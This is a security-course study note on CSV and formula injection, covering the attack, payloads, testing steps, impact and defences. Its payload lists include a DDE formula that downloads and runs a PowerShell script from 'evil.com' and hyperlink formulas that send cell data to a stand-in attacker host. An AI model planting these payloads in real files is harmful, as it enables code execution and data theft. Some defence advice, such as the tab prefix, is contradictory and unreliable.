---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.10 Formula Injection (CSV Injection)"
---

# 10.10 — Formula Injection (CSV Injection)

## What is Formula Injection?

Formula Injection (also called CSV Injection or Spreadsheet Injection) occurs when user input is included in CSV or spreadsheet exports without sanitization. Spreadsheet applications (Excel, LibreOffice, Google Sheets) treat cells starting with `=`, `+`, `-`, `@` as formulas and execute them when the file is opened.

```
ATTACK:
  1. User enters in web form: =cmd|' /C calc'!A0
  2. App exports data to CSV including this value
  3. Admin downloads the CSV → opens in Excel
  4. Excel executes the formula → calc.exe opens!
     (or: worse payloads for command execution)

AFFECTED APPLICATIONS:
  Microsoft Excel
  LibreOffice Calc
  Google Sheets (more sandboxed but some payloads work)
  Any spreadsheet that executes formulas
```

---

## Formula Injection Payloads

```
BASIC CALCULATOR (Proof of Concept):
  =cmd|' /C calc'!A0       ← Opens calc.exe on Windows
  =MSEXCEL|'..\..\..\..\Windows\system32\cmd.exe'!A0  ← cmd.exe

HYPERLINK INJECTION:
  =HYPERLINK("https://evil.com","Click here")
  → Creates clickable link to evil.com!
  → Phishing via exported CSV!

DNS EXFILTRATION (OOB):
  =DDE("cmd","/C nslookup attacker.com","")
  → DNS lookup → confirms formula injection!

DATA EXFILTRATION:
  =CONCATENATE("https://evil.com/?data=",A1)   ← A1 = another cell value
  =HYPERLINK(CONCATENATE("https://evil.com/?d=",A2),"Click me")
  → If victim clicks → sensitive data (from A2) sent to attacker!

FORMULA STARTERS (cells beginning with these execute formulas):
  =     (equals)
  +     (plus)
  -     (minus)
  @     (at sign — triggers DDE in older Excel)
  \t    (tab + formula in some versions)
```

---

## DDE (Dynamic Data Exchange) Attacks

```
DDE PAYLOADS (Excel-specific, more dangerous):
  =DDE("cmd","/C whoami","")
  =DDE("cmd","/C powershell -c IEX(New-Object Net.WebClient).DownloadString('https://evil.com/shell.ps1')","")
  
  These use DDE (a Windows inter-process protocol) to:
  → Launch cmd.exe with the given arguments!
  → Full command execution when the CSV is opened!

NOTE: Excel 2016+ shows warning before DDE execution
      But many users click "Enable" without reading!
```

---

## Testing for CSV Injection

```bash
# STEP 1: FIND FIELDS THAT APPEAR IN EXPORTS:
# - User profile fields
# - Product names, descriptions
# - Comment/review fields
# - Username

# STEP 2: INJECT TEST PAYLOAD:
# Enter in the field: =1+1
# Download the CSV/Excel export

# STEP 3: OPEN THE FILE:
# Open with Excel/LibreOffice
# If cell shows "2" (calculated 1+1) → FORMULA INJECTION!

# STEP 4: TRY REAL PAYLOAD:
# Enter: =HYPERLINK("https://evil.com","Click")
# Export and open → if link appears → confirmed!

# STEP 5: REPORT WITH CALC.EXE DEMO:
# =cmd|' /C calc'!A0
# Open CSV → if calc.exe opens → CONFIRMED (high impact demo)!
```

---

## Where to Look

```
HIGH-RISK EXPORT FEATURES:
  ✓ User management → export users to CSV
  ✓ Transaction/order exports
  ✓ Customer data exports
  ✓ Bug tracker / issue exports (Jira, GitHub)
  ✓ CRM contact exports
  ✓ Analytics exports (usernames appear in data)
  ✓ Support ticket exports
  ✓ Any "Download CSV/Excel/Report" feature

FIELDS MOST LIKELY TO BE INJECTED:
  Username, name, email (local part), 
  description, notes, comments, address
```

---

## Impact

```
SEVERITY: Medium to High

IMPACTS:
  ✓ Code execution on admin/analyst's machine (if they open CSV)
  ✓ Data exfiltration (hyperlinks to attacker server)
  ✓ Phishing via injected links in exported data
  ✓ Corporate espionage: automated data leak when analyst exports + opens

REAL-WORLD SCENARIO:
  1. Attacker creates account with name: =HYPERLINK("https://evil.com/","Normal Company Name")
  2. Admin exports user list to Excel
  3. Admin clicks the "Normal Company Name" link
  4. Request goes to evil.com → attacker logs IP, session cookies?
     (No cookies — it's a desktop app! But: confirms file was opened)
  5. More dangerous: DDE payload → code execution on admin's machine!
```

---

## Defense

```
PROTECTION:
  1. Prefix all cells with a tab or space:
     Safe: "\t" + value  OR  " " + value
     → Excel won't treat " =formula" as a formula!
  
  2. Sanitize by removing/escaping formula starters:
     if value starts with = + - @ :
       prepend with '  (single quote — Excel treats as text)
       OR: escape the first char: =\formula
  
  3. Python (csv module):
     import csv
     def sanitize_for_csv(value):
         if isinstance(value, str) and value.startswith(('=','+','-','@')):
             value = "'" + value  # prepend single quote
         return value
  
  4. Set Content-Disposition header correctly:
     Content-Disposition: attachment; filename="export.csv"
     → Forces download rather than browser rendering
  
  5. Educate users: warn when opening CSV from external sources
  
  6. Use Content-Type: text/csv (not application/octet-stream)
     → Modern browsers may warn about formula content
```

---

## Related Notes
- [[08 - Log Injection]] — injection into text output
- [[Module 13 - File Upload]] — file-based attacks
- [[07 - XSS via HTTP Response Splitting]] — injection into response
